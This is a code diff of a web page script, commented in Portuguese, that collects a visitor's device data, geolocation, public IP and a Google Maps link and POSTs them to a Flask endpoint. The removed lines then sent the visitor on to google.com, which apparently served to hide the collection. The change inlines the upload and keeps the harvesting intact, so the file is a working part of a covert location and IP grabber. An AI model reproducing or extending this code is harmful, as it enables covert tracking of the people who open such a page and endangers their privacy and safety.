@@ -108,29 +108,6 @@ function getCurrentLocation() {
     });
 }
 
-async function sendDataAndRedirect(combinedData, callback) {
-    try {
-        // Envio dos dados coletados
-        const response = await fetch('/submit_data', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(combinedData)
-        });
-
-        const result = await response.json();
-        console.log('Resposta do Flask (combined data):', result);
-        
-        // Chama o callback após o envio ser concluído
-        if (callback) {
-            callback();
-        }
-    } catch (error) {
-        console.error('Erro ao enviar dados:', error.message);
-    }
-}
-
 async function initializePage() {
     try {
         const [deviceData, geolocationData, publicIP] = await Promise.all([
@@ -161,11 +138,17 @@ async function initializePage() {
             googleMapsLinkIP: googleMapsLinkIP
         };
 
-        // Enviar os dados e redirecionar
-        sendDataAndRedirect(combinedData, () => {
-            // Redireciona somente após o envio dos dados
-            window.location.href = "https://www.google.com";
+        // Send the combined data in one request
+        const response = await fetch('/submit_data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(combinedData)
         });
+
+        const result = await response.json();
+        console.log('Resposta do Flask (combined data):', result);
     } catch (error) {
         console.error('Erro ao obter dados:', error.message);
     }
